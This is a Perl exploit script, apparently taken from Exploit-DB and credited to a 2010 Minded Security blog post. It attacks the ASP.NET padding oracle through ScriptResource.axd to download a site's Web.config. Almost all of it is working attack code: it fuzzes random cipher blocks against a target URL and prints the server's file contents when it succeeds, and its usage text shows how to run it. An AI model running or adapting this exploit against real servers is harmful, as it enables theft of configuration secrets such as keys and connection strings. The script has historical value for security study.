# Source: http://blog.mindedsecurity.com/2010/10/breaking-net-encryption-with-or-without.html

#!/usr/bin/perl
#
#
#  Webconfig Bruter - exploit tool for downloading Web.config
#
#  FOr use this script you need Pudbuster.
#  Padbuster is a great tool and Brian Holyfield deserve all the credits.
#  Note from Exploit-db: This very first exploit was meant to work with Padbusterdornet or Padbuster v0.2. 
#  A similar exploitation vector was also added lately in Padbuster v0.3: 
#  http://www.gdssecurity.com/l/b/2010/10/04/padbuster-v0-3-and-the-net-padding-oracle-attack/
#  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15213.pl (padBuster.pl)
#
#
#  Giorgio Fedon - (giorgio.fedon@mindedsecurity.com)
#    
use LWP::UserAgent;
use strict;
use Getopt::Std;
use MIME::Base64;
use URI::Escape;
use Getopt::Long;
#Definition of vars for .NET
my $toEncodeDecode;
my $b64Encoded;
my $string;
my $returnVal;
my $testUrl;
my $testBytes;
my $sampleBytes;
my $testUrl = @ARGV[0]."\?d\=";
my $sampleBytes = @ARGV[1];
my $blockSize = @ARGV[2];
if ($#ARGV < 2) { 
 die "    
  Use: Web.config_bruter.pl ScriptResourceUrl Encrypted_Sample BlockSize
  Where: URL = The target URL (and query string if applicable)
         EncryptedSample = The encrypted value you want to use. 
         This need to come from Padbuster.
         BlockSize = The block size being used by the algorithm (8 or 16)
         Poc code by giorgio.fedon\@mindedsecurity.com
  Original Padbuster code from Brian Holyfield - Gotham Digital Science

Command Example:
./Web.config_bruter.pl https://127.0.0.1:8083/ScriptResource.axd  d1ARvno0iSA6Ez7Z0GEAmAy3BpX8a2 16
         
";}

my $method = "GET";
$sampleBytes = encoder($sampleBytes, 1);
my $testBytes = "\x00" x $blockSize;
my $counter = 0;
# Use random bytes
my @nums = (0..255);
my $status = 1;
  while ($status)
  {
   # Fuzz the test bytes
   for (my $byteNum = $blockSize - 1; $byteNum >= 0; $byteNum--)
   {
   substr($testBytes, $byteNum, 1, chr($nums[rand(@nums)]));
                  }      
      
                   # Combine the test bytes and the sample
   my $combinedTestBytes = encoder($testBytes.$sampleBytes, 0);
   chomp($combinedTestBytes);
   $combinedTestBytes =~ s/\%0A//g;
   # Ok, now make the request
   my ($status, $content, $location, $contentLength) = makeRequest($method, $testUrl.$combinedTestBytes);
   if ($status == "200")
   {
   # Remove this for "T" exploit
   if (index($content,"parent\.Sys\.Application") == -1)
   {
   print $content."\n\n";
   print "Total Requests:".$counter."\n\n";
   print "Resulting Exploit Block:".$combinedTestBytes."\n\n";
   last;
   }
   }
   $counter++;
   }
# The following code is taken from PadBuster. Credit: Brian Holyfield - Gotham Digital Science
#
# I also did the encoder / decoder, but your logic is definitely better
sub encoder
{
my ($toEncodeDecode, $oper) = @_; 
 # UrlDecoder Encoder
 if ($oper == 1)
   {
$toEncodeDecode =~ s/\-/\+/g;
$toEncodeDecode =~ s/\_/\//g;
my $count = chop($toEncodeDecode);
$toEncodeDecode = $toEncodeDecode.("=" x int($count));
$returnVal = decode_base64($toEncodeDecode);
   }
   else
   {
$b64Encoded = encode_base64($toEncodeDecode);
$b64Encoded =~ s/(\r|\n)//g;
$b64Encoded =~ s/\+/\-/g;
$b64Encoded =~ s/\//\_/g;
my $count = $b64Encoded =~ s/\=//g;
($count eq "") ? ($count = 0) : "";
$returnVal = $b64Encoded.$count;
   }
 
 return $returnVal;
}
sub makeRequest {
 my ($method, $url) = @_; 
 my ($lwp, $status, $content, $req, $location, $contentLength);   
 
 # Setup LWP UserAgent
 $lwp = LWP::UserAgent->new(env_proxy => 1,
                            keep_alive => 1,
                            timeout => 30,
       requests_redirectable => [],
                            );
 
 $req = new HTTP::Request $method => $url;

 my $response = $lwp->request($req);
 
 # Extract the required attributes from the response
 $status = substr($response->status_line, 0, 3);
 $content = $response->content;
 #print $content;
 $location = $response->header("Location");
 if ($location eq "")
 {
  $location = "N/A";
 }
 $contentLength = $response->header("Content-Length");
 return ($status, $content, $location, $contentLength);
}